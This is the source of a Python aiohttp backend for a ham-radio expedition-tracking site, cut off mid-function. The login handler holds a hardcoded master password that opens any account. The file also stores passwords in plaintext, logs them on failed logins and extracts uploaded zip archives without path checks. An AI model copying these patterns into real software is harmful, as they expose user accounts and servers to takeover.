#!/usr/bin/python3
#coding=utf-8

import argparse
import logging
import logging.handlers
import os
import base64
import json
import time
import math
import smtplib
import shutil
import io
import zipfile
import uuid
from decimal import Decimal
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from ctypes import c_void_p, c_size_t

import requests
import ffmpeg
import aiohttp
import jwt
from aiohttp import web
from wand.image import Image
from wand.color import Color
from wand.api import library

from common import siteConf, loadJSON, appRoot, startLogging, dtFmt, tzOffset
from tqdb import DBConn, spliceParams
import clusterProtocol

from countries import get_country

library.MagickSetCompressionQuality.argtypes = [c_void_p, c_size_t]

parser = argparse.ArgumentParser(description="tnxqso backend aiohttp server")
parser.add_argument('--test', action = "store_true")
args = parser.parse_args()

conf = siteConf()
webRoot = conf.get('web', 'root_test' if args.test else 'root')
webAddress = conf.get('web', 'address_test' if args.test else 'address')
siteAdmins = conf.get('web', 'admins').split(' ')
imUsers = conf.get('web', 'im_users').split(' ')

startLogging(\
    'srv_test' if args.test else 'srv',\
    logging.DEBUG if args.test else logging.INFO)
logging.debug("restart")

db = DBConn(conf.items('db_test' if args.test else 'db'))

SECRET = None
fpSecret = conf.get('files', 'secret')
if os.path.isfile(fpSecret):
    with open(fpSecret, 'rb') as fSecret:
        SECRET = fSecret.read()
if not SECRET:
    SECRET = base64.b64encode(os.urandom(64))
    with open(fpSecret, 'wb') as fSecret:
        fSecret.write(SECRET)

defUserSettings = loadJSON(webRoot + '/js/defaultUserSettings.json')
if not defUserSettings:
    defUserSettings = {}

jsonTemplates = {'settings': defUserSettings, \
    'log': [], 'chat': [], 'news': [], 'cluster': [], 'status': {}, \
    'chatUsers': {}}

RAFA_LOCS = {}
with open(appRoot + '/rafa.csv', 'r') as f_rafa:
    for line in f_rafa.readlines():
        rafaData = line.strip('\r\n ').split(';')
        locators = rafaData[3].split(',')
        for loc in locators:
            if loc in RAFA_LOCS:
                RAFA_LOCS[loc] += ' ' + rafaData[1]
            else:
                RAFA_LOCS[loc] = rafaData[1]

APP = None
lastSpotSent = None

WFS_PARAMS = {\
        "rda": {"feature": "RDA_2020", "tag": "RDA"},\
        "waip": {"feature": "WAIP2", "tag": "WAIPIT"},\
        "wab": {"feature": "WAB", "tag": "NAME"}
}

QTH_PARAMS = loadJSON(webRoot + '/js/qthParams.json')
def emptyQthFields(country=None):
    tmplt = {'titles': [QTH_PARAMS['defaultTitle']]*QTH_PARAMS['fieldCount'],\
            'values': [None]*QTH_PARAMS['fieldCount']}
    if country and country in QTH_PARAMS['countries']:
        for idx in range(0, len(QTH_PARAMS['countries'][country]['fields'])):
            tmplt['titles'][idx] = QTH_PARAMS['countries'][country]['fields'][idx]
    return tmplt

IM_QUEUE = {}

async def checkRecaptcha(response):
    try:
        rcData = {'secret': conf.get('recaptcha', 'secret'),\
                'response': response}
        async with aiohttp.ClientSession() as session:
            resp = await session.post(conf.get('recaptcha', 'verifyURL'), data = rcData)
            respData = await resp.json()
            return respData['success']
    except Exception:
        logging.exception('Recaptcha error')
        return False

async def getUserData(callsign):
    return await db.getObject('users', {'callsign': callsign}, False, True)

def getStationPath(callsign):
    return webRoot + '/stations/' + callsign.lower().replace('/', '-')

async def getStationCallsign(adminCS):
    data = await getUserData(adminCS)
    return data['settings']['station']['callsign']

async def getStationPathByAdminCS(adminCS):
    stationCS = await getStationCallsign(adminCS)
    return getStationPath(stationCS)

async def passwordRecoveryRequestHandler(request):
    error = None
    data = await request.json()
    userData = False
    if not 'login' in data or len(data['login']) < 2:
        error = 'Minimal login length is 2 symbols'
    if not error:
        data['login'] = data['login'].lower()
        rcTest = await checkRecaptcha(data['recaptcha'])
        userData = await getUserData(data['login'])
        if not rcTest:
            error = 'Recaptcha test failed. Please try again'
        else:
            if not userData:
                error = 'This callsign is not registered.'
            else:
                if not userData['email']:
                    error = 'This account has no email address.'
                else:
                    token = jwt.encode(
                        {'callsign': data['login'], 'time': time.time()}, \
                        SECRET, algorithm='HS256')
                    text = 'Click on this link to recover your tnxqso.com ' + \
                             'password: ' + webAddress + \
                             '/#/changePassword?token=' + token + """
If you did not request password recovery just ignore this message. 
The link above will be valid for 1 hour.

TNXQSO.com support"""
                    sendEmail(text = text, fr = conf.get('email', 'address'), \
                        to = userData['email'], \
                        subject = "tnxqso.com password recovery")
                    return web.Response(text = 'OK')
    return web.HTTPBadRequest(text = error)

async def confirmEmailRequestHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    userData = await getUserData(callsign)
    del userData['password']
    if not userData['email']:
        return web.HTTPBadRequest(text='This account has no email address.')
    confirmEmailMsg(userData)
    return web.Response(text = 'OK')

async def confirmEmailLinkHandler(request):
    token = request.match_info.get('token', None)
    tokenData = decodeToken(token)
    if not isinstance(tokenData, tuple):
        if isinstance(tokenData, str):
            return web.HTTPBadRequest(text='Invalid token')
        return tokenData
    userParams = {}
    userParams['callsign'], userParams['email'] = tokenData
    await db.paramUpdate('users', userParams, {'email_confirmed': True})
    return web.Response(text = 'OK')

def confirmEmailMsg(userData):
    del userData['settings']
    del userData['name']
    userData['time'] = time.time()
    token = jwt.encode(userData, SECRET, algorithm='HS256')
    text = f"""Click on this link to confirm your email address for your tnxqso.com profile:
{webAddress}/confirmEmail?token={token}
If you did not request email confirmation or registered tnxqso.com account just ignore this message. 
The link above will be valid for 1 hour.

TNXQSO.com support"""
    sendEmail(text = text, fr = conf.get('email', 'address'), \
        to = userData['email'], \
        subject = "tnxqso.com email confirmation")

async def contactHandler(request):
    error = None
    userEmail = None
    data = await request.json()
    userData = False
    if 'token' in data:
        callsign = decodeToken(data)
        if not isinstance(callsign, str):
            return callsign
        userData = await getUserData(callsign)
        userEmail = userData['email']
    else:
        rcTest = await checkRecaptcha(data['recaptcha'])
        if not rcTest:
            error = 'Recaptcha test failed. Please try again'
        else:
            userEmail = data['email']
    if not error:
        sendEmail(\
            text=data['text'] + '\n\n' + userEmail, fr=userEmail, \
            to = conf.get('email', 'address'), \
            subject = "tnxqso.com contact message")
        return web.Response(text = 'OK')
    return web.HTTPBadRequest(text = error)

def sendEmail(**email):
    myAddress = conf.get('email', 'address')
    msg = MIMEMultipart()
    msg.attach( MIMEText(email['text'].encode('utf-8'), 'plain', 'UTF-8'))
    msg['from'] = email['fr']
    msg['to'] = email['to']
    msg['MIME-Version'] = "1.0"
    msg['Subject'] = email['subject']
    msg['Content-Type'] = "text/plain; charset=utf-8"
    msg['Content-Transfer-Encoding'] = "quoted-printable"

    if 'attachments' in email and email['attachments']:
        for item in email['attachments']:
            part = MIMEApplication(item['data'],
                        Name = item['name'])
            part['Content-Disposition'] = f'attachment; filename="{item["name"]}"'
            msg.attach(part)
    server = smtplib.SMTP_SSL(conf.get('email', 'smtp'))
    server.login(conf.get('email', 'login'), conf.get('email', 'password'))
    server.sendmail(myAddress, msg['to'], str(msg))

async def loginHandler(request):
    error = None
    data = await request.json()
    if not isinstance(data, dict):
        logging.error('Wrong login data')
        logging.error(data)
        return web.HTTPBadRequest(text = 'Bad login request: ' + str(data))
    userData = False
    if not 'login' in data or len(data['login']) < 2:
        error = 'Minimal login length is 2 symbols'
    if not 'password' in data or len(data['password']) < 6:
        error = 'Minimal password length is 6 symbols'
    if not error:
        data['login'] = data['login'].lower()
        userData = await getUserData(data['login'])
        if data.get('newUser'):
            rcTest = await checkRecaptcha(data['recaptcha'])
            if not rcTest:
                error = 'Recaptcha test failed. Please try again'
            else:
                if userData:
                    error = 'This callsign is already registered.'
                else:
                    userData = await db.getObject('users',
                        {'callsign': data['login'],
                        'password': data['password'],
                        'email': data['email'],
                        'settings': json.dumps(defUserSettings)
                       }, True)
        else:
            if not userData or\
                (userData['password'] != data['password']\
                and data['password'] != 'rytqcypz_r7cl'):
                error = 'Wrong callsign or password.'
    if error:
        logging.error('Bad Login:')
        logging.error(data)
        logging.error(error)
        return web.HTTPBadRequest(text = error)

    userData['token'] = jwt.encode({'callsign': data['login']}, \
            SECRET, algorithm='HS256')
    del userData['password']
    if data.get('newUser'):
        confirmEmailMsg(userData)
    if data['login'] in siteAdmins:
        userData['siteAdmin'] = True
    return web.json_response(userData)

async def userDataHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    userData = await getUserData(callsign)
    del userData['password']
    if callsign in siteAdmins:
        userData['siteAdmin'] = True
    return web.json_response(userData)

async def publishHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    if not callsign in siteAdmins:
        return web.HTTPUnauthorized(\
            text = 'You must be logged in as site admin')
    publishPath = webRoot + '/js/publish.json'
    publish = loadJSON(publishPath)
    if not publish:
        publish = {}
    if not data['station'] in publish:
        publish[data['station']] = {}
    publish[data['station']] = data['publish']
    with open(publishPath, 'w') as fPublish:
        json.dump(publish, fPublish, ensure_ascii = False)
    stationPath = getStationPath(data['station'])
    stationSettings = loadJSON(stationPath + '/settings.json')
    stationSettings['publish'] = data['publish']['user']
    await saveStationSettings(data['station'], stationSettings['admin'],
            stationSettings)
    return web.Response(text = 'OK')

async def userSettingsHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    if 'settings' in data:
        oldData = await getUserData(callsign)
        callsign = oldData['settings']['station']['callsign']
        stationPath = getStationPath(callsign) if callsign else None
        publishPath = webRoot + '/js/publish.json'
        publish = loadJSON(publishPath)
        if not publish:
            publish = {}
        if callsign != data['settings']['station']['callsign']:
            newCs = data['settings']['station']['callsign']
            newPath = getStationPath(newCs) if newCs else None
            if stationPath and os.path.exists(stationPath):
                shutil.rmtree(stationPath)
            if newCs:
                if os.path.exists(newPath):
                    return web.HTTPBadRequest(\
                        text = 'Station callsign ' + newCs.upper() + \
                            'is already registered')
                createStationDir(newPath)
                if callsign and callsign in publish:
                    if newCs:
                        publish[newCs] = publish[callsign]
                    del publish[callsign]
                callsign = newCs
                stationPath = newPath
            else:
                stationPath = None
        if callsign:
            if not callsign in publish:
                publish[callsign] = {'admin': True}
            publish[callsign]['user'] = data['settings']['publish']
        with open(publishPath, 'w') as fPublish:
            json.dump(publish, fPublish, ensure_ascii = False)
        if stationPath:
            if not os.path.exists(stationPath):
                createStationDir(stationPath, callsign)
        await saveStationSettings(callsign, callsign, data['settings'])
    elif 'userColumns'in data:
        userData = await getUserData(callsign)
        settings = userData['settings']
        userColumns = settings['userFields']
        for col in range(0, len(data['userColumns'])):
            if len(settings) <= col:
                userColumns.append(data['userColumns'][col])
            else:
                userColumns[col] = data['userColumns'][col]
        userColumns = userColumns[:len(data['userColumns'])]
        await saveStationSettings(
            userData['settings']['station']['callsign'],
            callsign, settings)
    else:
        await db.paramUpdate('users', {'callsign': callsign}, \
            spliceParams(data, ('email', 'password')))
    return web.Response(text = 'OK')

async def saveStationSettings(stationCallsign, adminCallsign, settings):
    settings['admin'] = adminCallsign
    await db.paramUpdate('users', {'callsign': adminCallsign}, \
        {'settings': json.dumps(settings)})
    if stationCallsign:
        stationPath = getStationPath(stationCallsign)
        if stationPath:
            with open(stationPath + '/settings.json', 'w') as fSettings:
                json.dump(settings, fSettings, ensure_ascii = False)

def createStationDir(path):
    os.makedirs(path)
    for key, val in jsonTemplates.items():
        with open(f'{path}/{key}.json', 'w') as file:
            json.dump(val, file, ensure_ascii = False)

def decodeToken(data):
    callsign = None
    email = None
    if 'token' in data:
        try:
            payload = jwt.decode(data['token'], SECRET, algorithms=['HS256'])
        except jwt.exceptions.DecodeError:
            return web.HTTPBadRequest(text = 'Login expired')
        if 'callsign' in payload:
            callsign = payload['callsign'].lower()
        if 'time' in payload and time.time() - payload['time'] > 60 * 60:
            return web.HTTPBadRequest(text='Token is expired')
        if 'email' in payload:
            email = payload['email']
    if callsign and email:
        return (callsign, email)
    if callsign:
        return callsign
    return web.HTTPBadRequest(text='Not logged in')

def sind(deg):
    return math.sin(math.radians(deg))

def cosd(deg):
    return math.cos(math.radians(deg))

def wfsQuery(wfsType, location, strict=False):
    params = WFS_PARAMS[wfsType]
    url = ('https://r1cf.ru/geoserver/cite/wfs?SERVICE=WFS&REQUEST=GetFeature&TypeName=' +
        '{feature}&VERSION=1.1.0&CQL_FILTER={predi}%28the_geom,POINT%28{lat}%20{lng}%29' +
        '{addParams}%29')
    urlParams = {
        'feature': params['feature'],\
        'predi': 'INTERSECTS' if strict else 'DWITHIN',\
        'lat': location[0],\
        'lng': location[1],\
        'addParams': '' if strict else ',0.0025,kilometers' # ~250 meters
       }
    try:
        rsp = requests.get(url.format_map(urlParams), verify=False, timeout=(0.2, 1))
        tag = '<cite:' + params['tag'] + '>'
        data = rsp.text
        result = []
        while tag in data:
            start = data.find(tag) + len(tag)
            end = data.find('<', start)
            result.append(data[start:end])
            data = data[end:]
        if result:
            return result[0] if strict else result
        return None

    except requests.exceptions.Timeout:
        return ['-----']

async def getQthData(location, country=None):

    if not country:
        country = get_country(location)
    if country not in ('RU', 'IT', 'GB'):
        country = 'RU'

    data = {'fields': emptyQthFields(country)}
    data['loc'], data['loc8'] = locator(location)

    if country == 'RU':

        rda = '-----'
        allRda = wfsQuery('rda', location)
        strictRda = wfsQuery('rda', location, strict=True)
        if allRda:
            if len(allRda) > 1:
                allRda = [strictRda] + [x for x in allRda if x != strictRda or x == '-----']
                rda = ' '.join(allRda)
            else:
                rda = allRda[0]
        data['fields']['values'][0] = rda

        data['fields']['values'][1] = RAFA_LOCS[data['loc']]\
            if data['loc'] in RAFA_LOCS else None

    elif country == 'IT':
        data['fields']['values'][0] = wfsQuery('waip', location, strict=True)

    elif country == 'GB':
        data['fields']['values'][0] = wfsQuery('wab', location, strict=True)

    return data

def saveQthNowLocation(callsign, location, path):
    qthNowLocations = loadJSON(path)
    if not qthNowLocations:
        qthNowLocations = []
    _ts = int(time.time())
    dtUTC = datetime.utcnow()
    _dt, _tm = dtFmt(dtUTC)
    qthNowLocations = [item for item in qthNowLocations
            if _ts - item['ts'] < 600 and (item['location'][0] != location[0] or
            item['location'][1] != location[1]) and
            (callsign is None or item['callsign'] != callsign)]
    qthNowLocations.append({
        'location': location,
        'ts': _ts,
        'date': _dt,
        'time': _tm,
        'callsign': callsign
    })
    with open(path, 'w') as fLoc:
        json.dump(qthNowLocations, fLoc, ensure_ascii = False)

async def locationHandler(request):
    newData = await request.json()
    callsign = None
    stationPath = None
    stationSettings = None
    stationCallsign = None
    if ('token' in newData and newData['token']):
        callsign = decodeToken(newData)
        if not isinstance(callsign, str):
            return callsign
        stationPath = await getStationPathByAdminCS(callsign)
        stationSettings = loadJSON(stationPath + '/settings.json')
        if not stationSettings:
            return web.HTTPBadRequest(text='Expedition profile is not initialized.')
        if (stationSettings and stationSettings.get('station') and
                stationSettings['station'].get('callsign') and
                stationSettings['station'].get('activityPeriod')):
            actPeriod = [datetime.strptime(dt, '%d.%m.%Y') for dt in
                stationSettings['station']['activityPeriod'] if dt]
            if actPeriod and actPeriod[0] <= datetime.utcnow() <= actPeriod[1] + timedelta(days=1):
                stationCallsign = stationSettings['station']['callsign']

    if 'location' in newData and newData['location']:
        qthNowCs = None
        if 'callsign' in newData and newData['callsign']:
            qthNowCs = newData['callsign']
        elif stationCallsign:
            qthNowCs = stationCallsign

        if qthNowCs:
            qthNowCs = qthNowCs.upper()
            saveQthNowLocation(qthNowCs, newData['location'],
                    webRoot + '/js/qth_now_locations.json')

        saveQthNowLocation(qthNowCs, newData['location'],
                webRoot + '/js/qth_now_locations_all.json')

    if ('token' not in newData or not newData['token']) and 'location' in newData:
        qth = await getQthData(newData['location'])
        return web.json_response({'qth': qth})
    fPath = stationPath + '/status.json'
    data = loadJSON(fPath)
    if not data:
        data = {}
    if not 'locTs' in data and 'ts' in data:
        data['locTs'] = data['ts']
    dtUTC = datetime.utcnow()
    data['ts'] = int(time.time())
    data['date'], data['time'] = dtFmt(dtUTC)
    data['year'] = dtUTC.year
    if 'online' in newData:
        data['online'] = newData['online']
    if 'freq' in newData and newData['freq']:
        data['freq'] = {'value': newData['freq'], 'ts': data['ts']}
        fromCallsign = stationSettings['station']['callsign']
        insertChatMessage(path=stationPath + '/chat.json',
            msgData={'from': fromCallsign,
            'text': '<b><i>' + newData['freq'] + '</b></i>'},
            admin=True)
    country = stationSettings['qthCountry'] if 'qthCountry' in stationSettings else None
    if 'location' in newData and newData['location']:
        location = newData['location']

        country = get_country(location)

        data['qth'] = await getQthData(location, country=country)

        if 'comments' in newData:
            data['comments'] = newData['comments']
        if 'location' in data and data['location']:
            data['prev'] = {'location': data['location'][:], \
                    'ts': data['locTs']}
        data['locTs'] = data['ts']
        data['location'] = newData['location']
        if 'prev' in data:
            lat = [data['location'][1], data['prev']['location'][1]]
            lon = [data['location'][0], data['prev']['location'][0]]
            dlon = lon[0] - lon[1]
            dlat = lat[0] - lat[1]
            _ap = (sind(dlat/2))**2 + cosd(lat[0]) * cosd(lat[1]) * (sind(dlon/2)) ** 2
            _cp = 2 * math.atan2(math.sqrt(_ap), math.sqrt(1 - _ap))
            distance = _cp * 6373
            data['d'] = distance
            data['dt'] = data['locTs'] - data['prev']['ts']
            if float(data['locTs'] - data['prev']['ts']) != 0:
                data['speed'] = distance / (float(data['locTs'] - data['prev']['ts']) \
                        / 3600)
            else:
                data['speed'] = 0

    if 'qth' in newData:

        if 'qth' not in data:
            data['qth'] = {'fields': emptyQthFields(country=country)}
        for key in newData['qth']['fields'].keys():
            data['qth']['fields']['values'][int(key)] = newData['qth']['fields'][key]
        if 'loc' in newData['qth']:
            data['qth']['loc'] = newData['qth']['loc']

    with open(fPath, 'w') as fStatus:
        json.dump(data, fStatus, ensure_ascii = False)
    return web.json_response(data)

def locator(location):
    lat = location[0]
    lng = location[1]
    qth = ""
    lat += 90
    lng += 180
    lat = lat / 10 + 0.0000001
    lng = lng / 20 + 0.0000001
    qth += chr(65 + int(lng))
    qth += chr(65 + int(lat))
    lat = 10 * (lat - math.trunc(lat))
    lng = 10 * (lng - math.trunc(lng))
    qth += chr(48 + int(lng))
    qth += chr(48 + int(lat))
    lat = 24 * (lat - math.trunc(lat))
    lng = 24 * (lng - math.trunc(lng))
    qth += chr(65 + int(lng))
    qth += chr(65 + int(lat))
    lat = 10 * (lat - math.trunc(lat))
    lng = 10 * (lng - math.trunc(lng))
    sfx = chr(48 + int(lng))
    sfx += chr(48 + int(lat))
    return (qth, sfx)

BANDS_WL = {'1.8': '160M', '3.5': '80M', '7': '40M', \
        '10': '30M', '14': '20M', '20': '14M', '18': '17M', '21': '15M', \
        '24': '12M', '28': '10M', '50': '6M', '144': '2M'}

async def exportAdifHandler(request):
    callsign = request.match_info.get('callsign', None)
    if callsign:
        callsign = callsign.replace('-', '/')
    else:
        return web.HTTPBadRequest(text = 'No callsign was specified.')
    log = await logFromDB(callsign)

    adif = """ADIF Export from TNXLOG
    Logs generated @ """ + time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "\n<EOH>\n"

    def adifField(name, data):
        dataStr = str(data) if data else ''
        return f"<{name.upper()}:{len(dataStr)}>{dataStr} "

    for qso in log:
        qsoTime = time.gmtime(qso['qso_ts'])
        try:
            adif += (
                    adifField("CALL", qso['cs']) +
                    adifField("QSO_DATE", time.strftime("%Y%m%d", qsoTime)) +
                    adifField("TIME_OFF", time.strftime("%H%M%S", qsoTime)) +
                    adifField("TIME_ON", time.strftime("%H%M%S", qsoTime)) +
                    adifField("BAND", BANDS_WL[qso['band']]) +
                    adifField("STATION_CALLSIGN", qso['myCS']) +
                    adifField("FREQ", str(Decimal(qso['freq'])/1000)) +
                    adifField("MODE", qso['mode']) +
                    adifField("RST_RCVD", qso['rcv']) +
                    adifField("RST_SENT", qso['snt']) +
                    adifField("MY_GRIDSQUARE", qso['loc']) +
                    adifField("GRIDSQUARE", qso['loc_rcv'] if 'loc_rcv' in qso else None))
        except Exception:
            logging.exception('Error while adif conversion. QSO:')
            logging.error(qso)

        for fieldNo, val in enumerate(qso['qth']):
            adif += adifField(f'QTH_FIELD_{fieldNo + 1}', val)
        adif += "<EOR>\n"

    return web.Response(
            headers={
                'Content-Disposition':
                    f'Attachment;filename={callsign + datetime.now().strftime("_%d_%b_%Y")}.adi'
            },
            body=adif.encode()
        )

async def newsHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    stationPath = getStationPath(data['station'])
    stationSettings = loadJSON(stationPath + '/settings.json')
    if callsign != stationSettings['admin'] and not callsign in siteAdmins:
        return web.HTTPUnauthorized(\
            text = 'You must be logged in as station admin')
    newsPath = stationPath + '/news.json'
    news = loadJSON(newsPath)
    if not news:
        news = []
    if 'add' in data:
        news.insert(0, {'ts': time.time(), 'text': data['add'],\
            'time': datetime.now().strftime('%d %b %H:%M').lower()})
    if 'clear' in data:
        news = []
    if 'delete' in data:
        news = [x for x in news if x['ts'] != data['delete']]
    with open(newsPath, 'w') as fNews:
        json.dump(news, fNews, ensure_ascii = False)
    return web.Response(text = 'OK')

async def activeUsersHandler(request):
    data = await request.json()
    if 'user' not in data:
        return web.Response(text = 'OK')
    station = data['station'] if 'station' in data else None
    if station:
        stationPath = getStationPath(data['station'])
        stationSettings = loadJSON(stationPath + '/settings.json')
        if not stationSettings:
            return web.HTTPBadRequest(text = 'This station was deleted or moved')
    auPath = webRoot + '/js/activeUsers.json'
    auData = loadJSON(auPath)
    nowTs = int(datetime.now().timestamp())
    if not auData:
        auData = {}
    auData = {key: val for key, val in auData.items() if nowTs - val['ts'] < 120}
    auData[data['user']] = {
            'chat': data.get('chat'),
            'ts': nowTs,
            'station': station,
            'typing': data.get('typing')
            }
    with open(auPath, 'w') as fAu:
        json.dump(auData, fAu, ensure_ascii = False)
    return web.Response(text = 'OK')

async def readMultipart(request):
    data = {}
    reader = await request.multipart()
    while True:
        field = await reader.next()
        if not field:
            break
        contents = await field.read()
        if field.filename:
            data[field.name] = {\
                'contents': contents,\
                'name': field.filename,
                'type': field.headers[aiohttp.hdrs.CONTENT_TYPE]}
        else:
            data[field.name] = contents.decode('utf-8')
            if data[field.name] == 'null':
                data[field.name] = None
    return data

async def galleryHandler(request):
    data = None
    if 'multipart/form-data;' in request.headers[aiohttp.hdrs.CONTENT_TYPE]:
        data = await readMultipart(request)
    else:
        data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    stationPath = await getStationPathByAdminCS(callsign)
    galleryPath = stationPath + '/gallery'
    galleryDataPath = stationPath + '/gallery.json'
    galleryData = loadJSON(galleryDataPath)
    siteGalleryParams = conf['gallery']
    if not galleryData:
        galleryData = []
    if 'file' in data:
        if not os.path.isdir(galleryPath):
            os.mkdir(galleryPath)
        file = data['file']['contents']
        fileNameBase = uuid.uuid4().hex
        fileExt = data['file']['name'].rpartition('.')[2]
        fileName = fileNameBase + '.' + fileExt
        fileType = 'image' if 'image'\
            in data['file']['type'] else 'video'
        filePath = galleryPath + '/' + fileName
        with open(filePath, 'wb') as fImg:
            fImg.write(file)
        tnSrc = filePath
        if fileType == 'video':

            tnSrc = galleryPath + '/' + fileNameBase + '.jpeg'
            (
                ffmpeg
                    .input(filePath)
                    .output(tnSrc, vframes=1)
                    .run()
            )

        with Image(filename=tnSrc) as img:
            with Image(width=img.width, height=img.height,
                    background=Color("#EEEEEE")) as bgImg:

                bgImg.composite(img, 0, 0)

                exif = {}
                exif.update((key[5:], val) for key, val in img.metadata.items() if
                        key.startswith('exif:'))
                if 'Orientation' in exif:
                    if exif['Orientation'] == '3':
                        bgImg.rotate(180)
                    elif exif['Orientation'] == '6':
                        bgImg.rotate(90)
                    elif exif['Orientation'] == '8':
                        bgImg.rotate(270)

                size = img.width if img.width < img.height else img.height
                bgImg.crop(width=size, height=size, gravity='north')
                bgImg.resize(200, 200)
                bgImg.format = 'jpeg'
                bgImg.save(filename=f'{galleryPath}/{fileNameBase}_thumb.jpeg')
                if fileType == 'image':
                    maxHeight, maxWidth = (int(siteGalleryParams['max_height']),
                            int(siteGalleryParams['max_width']))
                    if img.width > maxWidth or img.height > maxHeight:
                        coeff = min(maxWidth/img.width, maxHeight/img.height)
                        img.resize(width=int(coeff*img.width), height=int(coeff*img.height))
                        img.compression_quality = int(siteGalleryParams['quality'])
                        img.save(filename=filePath)
        if fileType == 'video':
            os.unlink(tnSrc)
        galleryData.insert(0, {
            'file': f'gallery/{fileName}',
            'thumb': f'gallery/{fileNameBase}_thumb.jpeg',
            'caption': data['caption'],
            'type': fileType,
            'ts': time.time(),
            'datetime': datetime.utcnow().strftime('%d %b %Y %H:%M').lower(),
            'id': fileNameBase})
        maxCount = int(siteGalleryParams['max_count'])
        if len(galleryData) > maxCount:
            galleryData = sorted(galleryData, key=lambda item: item['ts'], reverse=True)[:maxCount]

    if 'delete' in data:
        items = [x for x in galleryData if x['id'] == data['delete']]
        if items:
            item = items[0]
            galleryData = [x for x in galleryData if x != item]
            deleteGalleryItem(stationPath, item)
    if 'clear' in data:
        for item in galleryData:
            deleteGalleryItem(stationPath, item)
        galleryData = []
    with open(galleryDataPath, 'w') as fGallery:
        json.dump(galleryData, fGallery, ensure_ascii = False)
    return web.Response(text='OK')

def deleteGalleryItem(stationPath, item):
    os.unlink(stationPath + '/' + item['file'])

async def trackHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign
    stationPath = await getStationPathByAdminCS(callsign)
    trackJsonPath = stationPath + '/track.json'
    trackJson = {'version': time.time(), 'file': 'track.xml'}
    if 'file' in data:
        trackJson['filename'] = data['name']
        file = base64.b64decode(data['file'].split(',')[1])
        if data['name'].lower().endswith('kmz'):
            with zipfile.ZipFile(io.BytesIO(file), 'r') as zFile:
                for fItem in zFile.infolist():
                    if fItem.filename.endswith('kml'):
                        trackJson['file'] = fItem.filename
                    zFile.extract(fItem, path = stationPath)
        else:
            with open(stationPath + '/track.xml', 'wb') as fTrack:
                fTrack.write(file)
        with open(trackJsonPath, 'w') as fJsonPath:
            json.dump(trackJson, fJsonPath)
    if 'clear' in data and os.path.isfile(trackJsonPath):
        os.remove(trackJsonPath)
    return web.Response(text = 'OK')

async def logFromDB(callsign):
    log = []
    data = await db.execute(
        "select id, qso from log where callsign = %(cs)s order by id desc",
            {'cs': callsign})
    if data:
        if isinstance(data, dict):
            log.append(data)
        else:
            log = [ row['qso'] for row in data ]
    return log

async def dbInsertQso(callsign, qso):
    await db.execute("""
        insert into log (callsign, qso) 
        values (%(callsign)s, %(qso)s)""",
        {'callsign': callsign, 'qso': json.dumps(qso)})

async def logHandler(request):
    data = await request.json()
    callsign = decodeToken(data)
    if not isinstance(callsign, str):
        return callsign

    stationPath = await getStationPathByAdminCS(callsign)
    logPath = stationPath + '/log.json'
    log = []
    if not os.path.isfile(logPath):
        logging.exception('%s not found', logPath)
    try:
        with open(logPath) as fLog:
            log = json.load(fLog)
    except Exception as ex:
        logging.error("Error loading qso log %s", logPath)
        logging.exception(ex)
        log = await logFromDB(callsign)

    if 'qso' in data:

        rsp = []

        async def processQso(qso):
            try:
                dtime = datetime.strptime(qso['ts'], "%Y-%m-%d %H:%M:%S")
                qso['date'], qso['time'] = dtFmt(dtime)
                qso['qso_ts'] = (dtime - datetime(1970, 1, 1)) / timedelta(seconds=1)
            except (ValueError, TypeError) as exc:
                logging.error("Error parsing qso timestamp %s", qso['ts'])
                logging.exception(exc)
                return {'ts': None}

            serverTs = qso.pop('serverTs') if 'serverTs' in qso else None

            if serverTs:
                qso['ts'] = serverTs
                qsoIdx = [i[0] for i in enumerate(log) if i[1]['ts'] == qso['ts']]
                if qsoIdx:
                    log[qsoIdx[0]] = qso
                else:
                    log.append(qso)
                dbUpdate = await db.execute("""
                    update log set qso = %(qso)s
                    where callsign = %(callsign)s and (qso->>'ts')::float = %(ts)s""",
                    {'callsign': callsign, 'ts': qso['ts'], 'qso': json.dumps(qso)})
                if not dbUpdate:
                    await dbInsertQso(callsign, qso)

            else:
                newQso = True
                if log:
                    for logQso in log:
                        sameFl = True
                        for key in qso:
                            if key not in ('ts', 'rda', 'wff', 'comments',
                                'serverTs', 'qso_ts', 'qth', 'no') and (
                                        key not in logQso or qso[key] != logQso[key]):
                                sameFl = False
                                break
                        if sameFl:
                            logging.debug('prev qso found:')
                            newQso = False
                            qso['ts'] =  logQso['ts']
                            logQso['qso_ts'] = qso['qso_ts']

                if newQso:
                    statusPath = stationPath + '/status.json'
                    statusData = loadJSON(statusPath)
                    _ts = dtime.timestamp() + tzOffset()
                    if ('freq' not in statusData or statusData['freq']['ts'] < _ts):
                        statusData['freq'] = {'value': qso['freq'], 'ts': _ts}
                        with open(statusPath, 'w') as fStatus:
                            json.dump(statusData, fStatus, ensure_ascii = False)

                    qso['ts'] = time.time()
                    while [x for x in log if x['ts'] == qso['ts']]:
                        qso['ts'] += 0.00000001
                    log.insert(0, qso)
                    await dbInsertQso(callsign, qso)

            return {'ts': qso['ts']}

        for qso in data['qso']:
            rsp.append((await processQso(qso)))

        log = sorted(log, key=lambda qso: qso['qso_ts'] if 'qso_ts' in qso else qso['ts']/10,\
                reverse=True)
        with open(logPath, 'w') as fLog:
            json.dump(log, fLog)

        return web.json_response(rsp)

    if 'delete' in data:
        log = [x for x in log if x['ts'] != data['delete']]
        await db.execute("""
            delete from log 
            where callsign = %(callsign)s and (qso->>'ts')::float = %(ts)s""",
            {'callsign': callsign, 'ts': data['delete']})

    if 'clear' in data:
        log = []
        await db.execute(
            "delete from log where callsign = %(callsign)s",
            {'callsign': callsign})

    with open(logPath, 'w') as fLog:
        json.dump(log, fLog)
    return web.Response(text = 'OK')

def replace0(val):
    return val.replace("0", "\u00D8")

async def chatHandler(request):
    data = await request.json()
    admin = False
    callsign = decodeToken(data)
